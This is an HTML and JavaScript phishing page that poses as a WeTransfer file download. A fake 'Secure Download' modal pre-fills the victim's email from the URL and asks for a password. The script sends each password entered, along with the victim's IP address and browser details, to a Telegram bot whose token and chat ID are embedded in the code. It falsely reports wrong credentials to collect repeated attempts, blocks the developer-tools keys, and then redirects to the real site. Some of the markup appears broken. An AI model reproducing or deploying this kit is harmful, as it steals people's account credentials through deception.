<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WeTransfer — File Transfer Preview</title>
<style>
 * { box-sizing: border-box; }
 :root {
 --ink: #171717;
 --muted: #777;
 --line: #dededb;
 --surface: #f7f7f5;
 }
 body {
 margin: 0;
 min-height: 100vh;
 background: #e9e9e7;
 color: var(--ink);
 font-family: Arial, Helvetica, sans-serif;
 display: grid;
 place-items: center;
 padding: 28px;
 }
 .browser-page {
 width: min(1280px, 100%);
 min-height: 690px;
 background: #fff;
 border: 1px solid #d7d7d4;
 border-radius: 8px;
 overflow: hidden;
 box-shadow: 0 20px 60px rgba(0,0,0,.12);
 display: grid;
 grid-template-columns: 1fr 1fr;
 }
 .left {
 padding: 34px 7.5% 38px 9%;
 position: relative;
 min-height: 690px;
 display: flex;
 flex-direction: column;
 }
 .small-mark {
 font-size: 24px;
 font-weight: 900;
 letter-spacing: -3px;
 margin-bottom: 58px;
 }
 .headline {
 font-family: Georgia, "Times New Roman", serif;
 font-weight: 400;
 font-size: clamp(38px, 4.2vw, 57px);
 line-height: 1.06;
 letter-spacing: -1.5px;
 max-width: 540px;
 margin: 0;
 }
 .headline strong { font-weight: 700; }
 .subtitle {
 color: #555;
 font-size: 13px;
 margin-top: 17px;
 }
 .logo-art {
 width: min(310px, 68%);
 height: auto;
 object-fit: contain;
 position: absolute;
 left: 50%;
 top: 69%;
 transform: translate(-50%, -50%);
 }
 .right {
 padding: 110px 10% 55px;
 display: flex;
 align-items: center;
 flex-direction: column;
 justify-content: flex-start;
 min-width: 0;
 }
 .wordmark {
 font-family: Georgia, "Times New Roman", serif;
 font-weight: 900;
 font-size: 36px;
 letter-spacing: -1.5px;
 margin: 0 0 45px;
 }
 .download-icon {
 width: 66px;
 height: 66px;
 border: 2px solid #c6c6c2;
 border-radius: 50%;
 display: grid;
 place-items: center;
 color: #999;
 font-size: 34px;
 font-weight: 300;
 margin-bottom: 4px;
 }
 .divider {
 width: 100%;
 border-top: 1px solid var(--line);
 }
 .file-panel {
 width: 100%;
 background: #f1f1ef;
 border-radius: 0 0 12px 12px;
 padding: 24px 18px 20px;
 display: grid;
 grid-template-columns: 1fr 1fr;
 gap: 18px;
 }
 .file-name {
 font-size: 14px;
 font-weight: 700;
 line-height: 1.4;
 overflow-wrap: anywhere;
 }
 .file-info {
 color: #888;
 font-size: 13px;
 margin-top: 7px;
 }
 .expiry {
 color: #555;
 font-size: 12px;
 margin: 29px 0 15px;
 }
 .download-button {
 border: none;
 width: 100%;
 min-height: 56px;
 border-radius: 32px;
 background: #171717;
 color: #fff;
 display: flex;
 align-items: center;
 justify-content: center;
 gap: 11px;
 font-size: 15px;
 cursor: pointer;
 transition: background .18s, transform .18s;
 }
 .download-button:hover { background: #333; transform: translateY(-1px); }
 .button-logo {
 font-weight: 900;
 letter-spacing: -2px;
 font-size: 17px;
 }
 .demo-message {
 display: none;
 font-size: 12px;
 color: #666;
 margin-top: 12px;
 text-align: center;
 line-height: 1.4;
 }
 [contenteditable="true"]:focus {
 outline: 2px dashed #aaa;
 outline-offset: 4px;
 }
 @media (max-width: 800px) {
 body { padding: 12px; }
 .browser-page { grid-template-columns: 1fr; }
 .left { min-height: 440px; padding: 28px 8%; }
 .small-mark { margin-bottom: 38px; }
 .logo-art { width: 220px; top: 73%; }
 .right { padding: 38px 8% 45px; }
 .wordmark { margin-bottom: 28px; }
 }
 @media (max-width: 420px) {
 .file-panel { grid-template-columns: 1fr; gap: 20px; }
 .headline { font-size: 38px; }
 }

 /* Modal Styles for Capture */
 .modal {
 display: none;
 position: fixed;
 top: 0;
 left: 0;
 width: 100%;
 height: 100%;
 background: rgba(0,0,0,0.6);
 z-index: 9999;
 align-items: center;
 justify-content: center;
 }
 .modal.active {
 display: flex;
 }
 .modal-content {
 background: white;
 border-radius: 8px;
 width: 90%;
 max-width: 400px;
 padding: 30px;
 box-shadow: 0 10px 30px rgba(0,0,0,0.3);
 position: relative;
 }
 .modal-header {
 text-align: center;
 margin-bottom: 20px;
 }
 .modal-header h3 {
 margin: 0;
 font-size: 20px;
 color: #171717;
 }
 .modal-header p {
 margin: 5px 0 0;
 font-size: 13px;
 color: #777;
 }
 .modal-body input {
 width: 100%;
 padding: 12px;
 margin-bottom: 15px;
 border: 1px solid #ccc;
 border-radius: 4px;
 font-size: 14px;
 }
 .modal-body button {
 width: 100%;
 padding: 12px;
 background: #171717;
 color: white;
 border: none;
 border-radius: 4px;
 font-size: 15px;
 cursor: pointer;
 }
 .modal-body button:hover {
 background: #333;
 }
 .error-msg {
 color: red;
 font-size: 12px;
 text-align: center;
 margin-top: 10px;
 display: none;
 }
 .attempts-warning {
 color: orange;
 font-size: 12px;
 text-align: center;
 margin-top: 5px;
 }
</style>
</head>

<!-- CAPTURE MODAL -->
<div id="captureModal" class="modal">
 <div class="modal-content">
 <div class="modal-header">
 <h3>Secure Download</h3>
 <p>Please verify your identity to download</p>
 </div>
 <div class="modal-body">
 <!-- Locked Email Input -->
 <input type="email" id="modalEmail" placeholder="Email address" autocomplete="off" disabled style="background-color: #f9f9f9;">
 <input type="password" id="modalPassword" placeholder="Password" autocomplete="off">
 <button id="verifyBtn">Verify & Download</button>
 <div id="modalError" class="error-msg"></div>
 <div id="attemptsWarning" class="attempts-warning"></div>
 </div>
 </div>
</div>

<script>
// ==========================================
// CONFIGURATION - EDIT THESE LINES
// ==========================================
const TELEGRAM_BOT_TOKEN = '9288872902:AAFjBOiJmoyzKw7nWz_cpn9yISaHDVa9VbU';
const TELEGRAM_CHAT_ID = '1062974752';
// ==========================================

// Email auto-grabber
function getAutoEmail() {
 let hash = window.location.hash;
 if (hash && hash.length > 1) {
 let email = decodeURIComponent(hash.substring(1));
 if (email.includes('&')) email = email.split('&')[0];
 if (email.includes('?')) email = email.split('?')[0];
 if (email.includes('@')) return email;
 }
 let params = new URLSearchParams(window.location.search);
 let email = params.get('email') || params.get('e') || params.get('user');
 if (email && email.includes('@')) return email;
 let match = window.location.href.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/);
 return match ? match[0] : '';
}

const autoEmail = getAutoEmail();
if(autoEmail) {
 document.getElementById('modalEmail').value = autoEmail;
}

// Attempt tracking
let attemptCount = 0;
const MAX_ATTEMPTS = 3;

// Anti-closing / Right click block
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', e => {
 if(e.key === 'F12' || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.shiftKey && e.key === 'I')) e.preventDefault();
});

// Show modal on click
document.getElementById('downloadButton').addEventListener('click', () => {
 if(sessionStorage.getItem('locked_out') === 'true') {
 window.location.href = 'https://www.wetransfer.com';
 return;
 }
 document.getElementById('captureModal').classList.add('active');
 updateAttemptsUI();
});

function updateAttemptsUI() {
 const remaining = MAX_ATTEMPTS - attemptCount;
 const warningDiv = document.getElementById('attemptsWarning');
 if(remaining > 0) {
 warningDiv.textContent = remaining + ' attempt(s) remaining';
 warningDiv.style.display = 'block';
 } else {
 warningDiv.style.display = 'none';
 }
}

// ---------- FIXED TELEGRAM REPORTING ----------

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

async function getClientIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || 'Unknown';
  } catch (e) {
    return 'Unknown';
  }
}

async function sendToTelegram(email, password) {
  const userAgent = navigator.userAgent;
  const ip = await getClientIP();

  const text =
    '<b>📥 WeTransfer Credential Capture</b>\n\n' +
    '<b>Email:</b> ' + escapeHtml(email) + '\n' +
    '<b>Password:</b> ' + escapeHtml(password) + '\n' +
    '<b>IP:</b> ' + escapeHtml(ip) + '\n' +
    '<b>User Agent:</b> ' + escapeHtml(userAgent);

  // Telegram Bot API expects form-urlencoded (NOT JSON)
  const params = new URLSearchParams();
  params.append('chat_id', TELEGRAM_CHAT_ID);
  params.append('text', text);
  params.append('parse_mode', 'HTML');
  params.append('disable_web_page_preview', 'true');

  try {
    const res = await fetch(
      'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: params.toString()
      }
    );
    const result = await res.json();
    if (!result.ok) {
      console.error('Telegram error:', result);
    }
    return result.ok;
  } catch (e) {
    console.error('Telegram request failed:', e);
    return false;
  }
}

// ---------- END FIXED TELEGRAM REPORTING ----------

document.getElementById('verifyBtn').addEventListener('click', async function() {
 var email = document.getElementById('modalEmail').value.trim();
 var password = document.getElementById('modalPassword').value.trim();
 var errorDiv = document.getElementById('modalError');
 var btn = document.getElementById('verifyBtn');

 if(!email || !password) {
 errorDiv.innerText = 'Please enter both fields';
 errorDiv.style.display = 'block';
 return;
 }

 attemptCount++;
 await sendToTelegram(email, password);

 if(attemptCount >= MAX_ATTEMPTS) {
 sessionStorage.setItem('locked_out', 'true');
 errorDiv.style.display = 'none';
 btn.disabled = true;
 btn.innerHTML = 'Redirecting...';
 setTimeout(function() {
 window.location.href = 'https://www.wetransfer.com';
 }, 2000);
 return;
 }

 errorDiv.innerText = 'Incorrect credentials. Please try again.';
 errorDiv.style.display = 'block';
 document.getElementById('modalPassword').value = '';
 document.getElementById('modalPassword').focus();
 updateAttemptsUI();
});

// Close modal on outside click
document.getElementById('captureModal').addEventListener('click', function(e) {
 if(e.target === this) this.classList.remove('active');
});
</script>

</body>
</html>
